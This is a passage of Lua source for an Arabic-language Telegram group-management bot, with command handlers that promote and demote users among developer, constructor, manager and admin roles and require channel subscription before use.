send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم تنزيل العضو ◃ مطور↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and SudoBot(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم تنزيل العضو ◃ مطور↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ'
status  = '\n܁༯┆تم تنزيل العضو ◃ مطور↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
------------------------------------------------------------------------
if text == ("مسح الاساسين") and Sudo(msg) then
database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n܁༯┆تم مسح الاساسين ↝ ܰ')
return false
end

if text == 'المنشئين الاساسين' and Sudo(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n٭ 𖤓┆قائمة الاساسيين ↝↝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞ .\n"
else
end
end
if #list == 0 then
t = "܁༯┆لايوجد منشئين اساسيين ↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
return false
end

if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو منشى اساسي ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي @(.*)$") and Sudo(msg) then
local username = text:match("^رفع منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو منشى اساسي ↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ?? •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو منشى اساسي ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو منشى اساسي ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو ◃ منشى اساسي ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو ◃ منشى اساسي ↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو ◃ منشى اساسي ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو ◃ منشى اساسي ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المنشئين' and BasicConstructor(msg) then
database:del(bot_id..'Constructor'..msg.chat_id_)
texts = '܁༯┆ تم مسح قائمة المنشئين ↝ ܰ'
send(msg.chat_id_, msg.id_, texts)
end

if text == ("المنشئين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n٭ 𖤓┆قائمة المنشئين ↝↝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞ .\n"
else
end
end
if #list == 0 then
t = "܁༯┆لايوجد منشئين ↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
if text ==("المنشئ") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"܁༯┆المنشئ محذوف 😹😔↝ ܰ")
return false  
end
local UserName = (b.username_ or "R_IQ9")
send(msg.chat_id_, msg.id_,"܁༯┆منشئ المجموعةه ◃ ["..b.first_name_.."](T.me/"..UserName..") ↝ ܰ ")  
end,nil)   
end
end
end,nil)   
end
if text == "رفع منشئ" and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو منشى ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
if text and text:match("^رفع منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^رفع منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
database:sadd(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو منشى ↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^رفع منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^رفع منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:sadd(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو منشى ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو منشى ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
if text and text:match("^تنزيل منشئ$") and msg.reply_to_message_id_ and BasicConstructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المنشئين ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ @(.*)$") and BasicConstructor(msg) then
local username = text:match("^تنزيل منشئ @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Constructor'..msg.chat_id_, result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المنشئين ↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
end
------------------------------------------------------------------------
if text and text:match("^تنزيل منشئ (%d+)$") and BasicConstructor(msg) then
local userid = text:match("^تنزيل منشئ (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:srem(bot_id..'Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المنشئين ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المنشئين ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
------------------------------------------------------------------------
if text == 'مسح المدراء' and Constructor(msg) then
database:del(bot_id..'Manager'..msg.chat_id_)
texts = '܁༯┆ تم مسح قائمة المدراء ↝ ܰ '
send(msg.chat_id_, msg.id_, texts)
end
if text == ("المدراء") and Constructor(msg) then
local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
t = "\n٭ 𖤓┆قائمة المدراء ↝↝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞ .\n"
else
end
end
if #list == 0 then
t = "܁༯┆لايوجد مدراء ?? ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ' 
status  = '\n܁༯┆تم رفع العضو مدير ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^رفع مدير @(.*)$") and Constructor(msg) then
local username = text:match("^رفع مدير @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
database:sadd(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ' 
status  = '\n܁༯┆تم رفع العضو مدير ↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end 

if text and text:match("^رفع مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^رفع مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:sadd(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ' 
status  = '\n܁༯┆تم رفع العضو مدير ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ' 
status  = '\n܁༯┆تم رفع العضو مدير ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
if text == ("تنزيل مدير") and msg.reply_to_message_id_ and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المدراء ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير @(.*)$") and Constructor(msg) then
local username = text:match("^تنزيل مدير @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Manager'..msg.chat_id_, result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المدراء ↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مدير (%d+)$") and Constructor(msg) then
local userid = text:match("^تنزيل مدير (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
database:srem(bot_id..'Manager'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المدراء ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم تنزيل العضو من المدراء ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text ==("رفع الادمنيه") and Manager(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"܁༯┆  لا توجد ادمنيةه ليتم رفعهم ↝ ܰ") 
else
send(msg.chat_id_, msg.id_,"܁༯┆ تمت ترقيةه ◃ "..num2.."  من ادمنية المجموعةه ↝ ܰ") 
end
end,nil)   
end
if text == 'مسح الادمنيه' and Manager(msg) then
database:del(bot_id..'Mod:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '܁༯┆ تم مسح قائمة الادمنية ↝ ܰ')
end
if text == ("الادمنيه") and Manager(msg) then
local list = database:smembers(bot_id.."Mod:User"..msg.chat_id_)
t = "\n٭ 𖤓┆قائمة الادمنيه ↝↝◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."Tshake:User:Name" .. v)
if username then
t = t.."𖠵 "..k.." ◜[@"..username.."]◞ .\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "܁༯┆لايوجد ادمنيه ↝ ܰ"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع ادمن") and msg.reply_to_message_id_ and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
function start_function(extra, result, success)
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعطيل الرفع من قبل المنشئين ↝ ܰ') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو ادمن ↝ ܰ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن @(.*)$") and Manager(msg) then
local username = text:match("^رفع ادمن @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعطيل الرفع من قبل المنشئين ↝ ܰ') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"܁༯┆عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه  ↝ ܰ")   
return false 
end      
database:sadd(bot_id..'Mod:User'..msg.chat_id_, result.id_)
usertext = '\n܁༯┆هلو عمري ↝ ܰ '
status  = '\n܁༯┆تم رفع العضو ادمن ↝ ܰ'
texts = usertext..status
else
texts = '܁༯┆لايوجد حساب بهذا المعرف  ↝ ܰ'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع ادمن (%d+)$") and Manager(msg) then
local userid = text:match("^رفع ادمن (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..'⚜️]')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعطيل الرفع من قبل المنشئين ↝ ܰ') 
return false
end
database:sadd(bot_id..'Mod:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
